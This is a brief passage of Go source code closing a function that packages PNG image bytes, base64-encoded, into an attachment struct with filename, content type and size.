	return &GeneratedAttachment{
		Filename:    filename,
		ContentType: "image/png",
		Content:     base64.StdEncoding.EncodeToString(buf.Bytes()),
		Size:        buf.Len(),
	}, nil
}
